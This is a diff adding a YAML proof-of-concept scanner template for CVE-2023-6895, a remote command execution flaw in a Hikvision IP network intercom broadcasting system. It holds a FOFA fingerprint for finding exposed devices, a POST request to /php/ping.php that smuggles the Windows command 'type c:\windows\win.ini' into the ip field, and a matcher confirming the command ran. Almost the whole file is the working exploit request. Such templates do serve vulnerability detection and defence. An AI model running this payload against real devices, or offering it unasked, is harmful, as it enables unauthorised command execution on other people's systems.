@@ -1,0 +1,19 @@
+id: poc-yaml-hikvision-ip-network-intercom-broadcasting-system-rce
+info:
+  name: 海康威视 IP网络对讲广播系统 远程命令漏洞(CVE-2023-6895)
+  severity: critical
+  tags:
+  - rce
+  - CVE-2023-6895
+  finger: IP网络对讲广播系统
+  fofa: icon_hash="-1830859634"
+requests:
+- method: POST
+  path: /php/ping.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: jsondata%5Btype%5D=99&jsondata%5Bip%5D=type c:\windows\win.ini
+  expression: status_code == 200 && contains(body,"[fonts]") && contains(body,"[files]")
+    && !contains(body,"<")
+variables: {}
+transport: http
